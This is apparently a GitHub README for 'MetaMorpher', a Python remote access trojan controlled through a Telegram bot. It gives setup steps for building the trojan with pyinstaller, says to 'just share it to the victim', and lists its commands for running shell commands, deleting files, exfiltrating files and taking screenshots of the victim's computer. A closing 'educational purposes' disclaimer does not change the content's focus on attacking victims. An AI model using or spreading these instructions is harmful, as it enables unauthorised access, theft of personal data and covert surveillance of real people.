# MetaMorpher

MetaMorpher is a powerful tool to hack someone's system. It can be used to read and copy data from victim computers to hackers computer. It uses telegram bots to send files.

## Installation
Install the required packages like telebot, pillow using pip.
```bash
pip install telebot
pip install pillow
```
## Features
1) Able to create or delete file/folder 
2) It can send files to your telegram bot
3) It can send the screenshot of victim's system
4) Can run some bash commands on victim's computer
5) sends a notification when victim runs the file

## Usage

1) First, create your telegram bot using botfather or anything and get chat ID and token.
2) EDIT the MetaMorpher file and add your chatID, token.
```python
bot = telebot.TeleBot("Your bot Token")
chatID = 'Your Chat ID'
```
3) compile it with pyinstaller and you will get an exe and just share it to the victim!!
4) When victim runs the exe file you will get an message in your telegram bot and now you are able to manipulate his system.
## Commands
1) create-file <FILENAME> :- creates a new file in working directory
2) delete-file <FILENAME> :- deletes the file/folder of name <FILENAME>
3) cd <FOLDER> :- change current working directory
4) cmd <BASH_COMMAND> :- runs the specific bash commands
5) send-file-here <FILENAME> :- copy's the specific file and send's it to your telegram bot
6) send-sc :- sends the screenshot of victim computer to your telegram bot.


## Contributing

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.

Please make sure to update tests as appropriate.

## Disclaimer
The MetaMorpher tool on GitHub is for educational purposes only. I take no responsibility for its usage by third parties, and any illegal activities are strictly prohibited. Users must comply with security and privacy policies of social media platforms and obtain proper authorization. The toolkit may contain potentially harmful materials. Use at your own risk, adhering to relevant laws and regulations.

## Social media links
[Instagram](https://www.instagram.com/codewithsam127/)
[Github](https://github.com/samarthAkulkarni)
[Linkedin](www.linkedin.com/in/codewithsam127)